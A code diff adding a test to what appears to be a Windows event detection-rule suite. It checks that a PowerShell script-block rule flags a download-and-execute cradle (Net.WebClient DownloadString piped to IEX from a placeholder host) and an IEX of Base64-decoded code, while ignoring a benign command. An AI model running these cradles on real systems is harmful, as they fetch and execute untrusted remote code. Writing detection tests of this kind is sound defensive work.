@@ -301,3 +301,13 @@ def test_registry_values_match_with_or_without_hex_padding() -> None:
                                                              r"\Windows\PowerShell\ScriptBlockLogging"
                                                              r"\EnableScriptBlockLogging", Details=details))
     assert rule_matches(RULE["masquerade-renamed"], ev(1, Image=r"C:\Users\a\svc.exe", OriginalFileName="psexec.c"))
+
+
+def test_script_block_combinations_match_in_any_order() -> None:
+    rule = RULE["psh-scriptblock"]
+    hit = "$s = (New-Object Net.WebClient).DownloadString('http://x/a'); IEX $s"
+    assert rule_matches(rule, ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText=hit))
+    decoded = "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
+    assert rule_matches(rule, ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText=decoded))
+    plain = "Get-Service | Where-Object Status -eq 'Running'"
+    assert not rule_matches(rule, ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText=plain))
